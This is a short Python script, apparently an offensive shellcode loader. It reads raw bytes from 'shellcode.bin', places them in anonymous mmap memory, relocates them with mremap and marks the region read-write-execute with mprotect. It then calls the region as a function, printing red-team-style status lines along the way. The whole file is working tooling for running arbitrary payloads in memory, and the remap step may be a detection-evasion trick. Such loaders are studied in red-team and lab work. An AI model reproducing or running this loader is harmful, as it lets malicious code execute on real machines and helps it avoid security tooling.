import ctypes
import mmap
import os
import sys

PROT_READ = 1
PROT_WRITE = 2
PROT_EXEC = 4
MAP_PRIVATE = 2
MAP_ANONYMOUS = 0x20
MAP_FAILED = -1
MREMAP_MAYMOVE = 1

PAGE_SIZE = 0x1000

# Load libc and define mremap/mprotect
libc = ctypes.CDLL("libc.so.6")
mremap = libc.mremap
mremap.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_size_t, ctypes.c_int]
mremap.restype = ctypes.c_void_p

mprotect = libc.mprotect
mprotect.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int]
mprotect.restype = ctypes.c_int

# Load shellcode
with open("shellcode.bin", "rb") as f:
    shellcode = f.read()

shellcode_size = len(shellcode)
remap_size = ((shellcode_size + PAGE_SIZE - 1) // PAGE_SIZE) * PAGE_SIZE
print(f"[*] Loaded shellcode size: {shellcode_size} bytes")

# Allocate RW memory via mmap
libc.mmap.restype = ctypes.c_void_p
mem = libc.mmap(None, remap_size, PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)

if mem is None or mem == MAP_FAILED:
    print("[-] mmap failed")
    sys.exit(1)

mem_ptr = ctypes.c_void_p(mem)
mem_addr = ctypes.cast(mem_ptr, ctypes.c_void_p).value & 0xffffffffffffffff

print(f"[*] mmap allocated at: 0x{mem_addr:x}")

# Copy shellcode into memory
ctypes.memmove(mem_addr, shellcode, shellcode_size)

# Remap memory to a new location
new_mem = mremap(mem_addr, remap_size, remap_size, MREMAP_MAYMOVE)
new_mem_addr = ctypes.cast(ctypes.c_void_p(new_mem), ctypes.c_void_p).value

if new_mem_addr is None or new_mem_addr == ctypes.c_void_p(MAP_FAILED).value:
    print("[-] mremap failed")
    sys.exit(1)
print(f"[*] mremap moved memory to: 0x{new_mem_addr:x}")

# Change protection to RWX
res = mprotect(new_mem_addr, remap_size, PROT_READ | PROT_WRITE | PROT_EXEC)
if res != 0:
    print("[-] mprotect failed")
    sys.exit(1)
print("[*] RWX permission granted")

# Execute shellcode
FUNC = ctypes.CFUNCTYPE(None)
fn = FUNC(new_mem_addr)
print("[*] Jumping to shellcode...")
fn()

